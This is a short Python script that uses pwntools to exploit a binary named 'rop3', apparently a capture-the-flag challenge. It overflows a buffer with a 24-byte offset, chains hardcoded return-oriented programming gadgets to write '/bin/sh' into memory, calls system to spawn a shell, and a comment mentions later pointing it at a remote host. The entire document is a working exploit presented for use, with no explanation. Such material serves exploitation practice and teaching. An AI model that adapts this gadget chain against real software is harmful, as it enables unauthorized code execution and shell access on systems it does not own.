from pwn import *

io = process('./rop3') # or later: io = remote('HOST', PORT)
offset = 24
binsh_address = 0x404028
system_address = 0x401060
g1 = 0x40117E # mov [rdi], rsi
g2 = 0x401181 # xchg rdi, rsi
g3 = 0x401184 # pop rdi
g4 = 0x401185 # ret
payload = b'A' * offset + p64(g4) + p64(g3) + b'/bin/sh\0' + p64(g2) + p64(binsh_address) + p64(g1) + p64(binsh_address) + p64(system_address)
io.sendafter(b'ROP 3', payload)
io.interactive()
